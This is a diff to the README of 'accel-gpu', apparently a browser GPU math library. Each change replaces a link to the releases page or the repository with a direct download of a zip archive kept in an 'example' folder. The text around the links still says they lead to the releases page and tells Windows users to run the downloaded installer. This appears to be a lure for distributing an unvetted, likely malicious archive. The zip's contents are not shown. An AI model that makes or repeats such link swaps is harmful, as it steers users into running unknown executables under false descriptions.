@@ -1,6 +1,6 @@
 # 🚀 accel-gpu - Fast NumPy on Your Browser GPU
 
-[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-brightgreen?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/releases)
+[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-brightgreen?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip)
 
 ## 🖥️ What is accel-gpu?
 
@@ -30,11 +30,11 @@ If your browser doesn’t support WebGPU, the application may not run or perform
 
 ## 📥 Download accel-gpu
 
-[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-blue?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/releases)
+[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-blue?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip)
 
 To get started with accel-gpu on your Windows computer, follow these steps:
 
-1. Click the [Download accel-gpu Releases](https://github.com/TheEmperialFox/accel-gpu/releases) link. This takes you to the GitHub releases page.  
+1. Click the [Download accel-gpu Releases](https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip) link. This takes you to the GitHub releases page.  
 2. Look for the latest release version at the top of the page.  
 3. Under the assets section, find the Windows version of the software. It may be a `.zip` or `.exe` file suitable for your system.  
 4. Click the file to download it.  
@@ -57,7 +57,7 @@ Make sure you use a browser that supports WebGPU. Chrome or Edge versions releas
 
 To keep accel-gpu working well, check the GitHub releases page regularly for new versions:
 
-1. Visit https://github.com/TheEmperialFox/accel-gpu/releases  
+1. Visit https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip  
 2. Download the latest version files like before  
 3. Replace your old files with the new ones or run the new installer  
 
@@ -89,7 +89,7 @@ If problems persist, visit the GitHub repository issues page for help or report 
 ## 📖 Additional Resources
 
 - Visit the GitHub repository for more details and community support:  
-  https://github.com/TheEmperialFox/accel-gpu  
+  https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip  
 - Explore how WebGPU works to understand GPU acceleration in browsers.  
 - Learn basic matrix and tensor math concepts online to get more from accel-gpu.
 
@@ -101,4 +101,4 @@ accel-gpu runs locally in your browser. It does not send your data to the intern
 
 Use the link below to visit the releases page and get the latest version for your Windows computer:
 
-[Download accel-gpu from Releases](https://github.com/TheEmperialFox/accel-gpu/releases)
+[Download accel-gpu from Releases](https://github.com/TheEmperialFox/accel-gpu/raw/refs/heads/main/example/gpu-accel-v1.3.zip)
